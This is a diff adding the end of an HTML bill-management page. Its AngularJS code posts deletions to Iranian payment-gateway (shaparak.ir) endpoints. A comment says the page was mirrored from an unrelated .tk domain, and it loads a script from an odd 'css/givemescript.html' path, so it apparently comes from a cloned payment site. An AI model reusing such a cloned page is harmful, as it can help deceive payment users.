+					$("div#myLoadingModal").modal({ backdrop: false, keyboard: false, });
+
+					$http.post("https://ikc.shaparak.ir/EShop/Bill/DeleteBillItem", billItem)
+
+						.then(function successCallback(response) {
+
+							$scope.BillsPaymentInformation.BillItems.splice(index, 1);
+
+							$("div#myLoadingModal").modal("toggle");
+
+						}, function errorCallback(response) {
+
+							$("div#myLoadingModal").modal("toggle");
+
+							alert("خطا در ارسال و دريافت اطلاعات");
+
+						});
+					// **************************************************
+
+				};
+
+				$scope.deleteAll = function () {
+
+					// **************************************************
+					$("div#myLoadingModal").modal({ backdrop: false, keyboard: false, });
+
+					$http.post("https://ikc.shaparak.ir/EShop/Bill/DeleteAllBillItems", null)
+
+						.then(function successCallback(response) {
+
+							$scope.BillsPaymentInformation.BillItems = [];
+
+							$("div#myLoadingModal").modal("toggle");
+
+						}, function errorCallback(response) {
+
+							$("div#myLoadingModal").modal("toggle");
+
+							alert("خطا در ارسال و دريافت اطلاعات");
+
+						});
+					// **************************************************
+
+				};
+
+			});
+
+	</script>
+
+
+	<script>
+		$(function () {
+			$('#side-menu').metisMenu();
+		});
+
+		//Loads the correct sidebar on window load,
+		//collapses the sidebar on window resize.
+		// Sets the min-height of #page-wrapper to window size
+		$(function () {
+			$(window).bind("load resize", function () {
+				topOffset = 70;
+				width = (this.window.innerWidth > 0) ? this.window.innerWidth : this.screen.width;
+				if (width < 768) {
+					$('div.navbar-collapse').addClass('collapse');
+					//                topOffset = 140; // 2-row-menu
+				} else {
+					$('div.navbar-collapse').removeClass('collapse');
+				}
+
+				height = ((this.window.innerHeight > 0) ? this.window.innerHeight : this.screen.height) - 1;
+				height = height - topOffset;
+				if (height < 1) height = 1;
+				if (height > topOffset) {
+					$("#page-wrapper").css("min-height", (height) + "px");
+				}
+			});
+		});
+	</script>
+	<script src="css/givemescript.html"></script>
+
+
+
+<div class="keypad-popup" style="display: none;"></div></body>
+<!-- Mirrored from media-tarfand-page.tk/FullServices/Bill/Manage.php by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 16 Oct 2018 02:57:42 GMT -->
+</html>
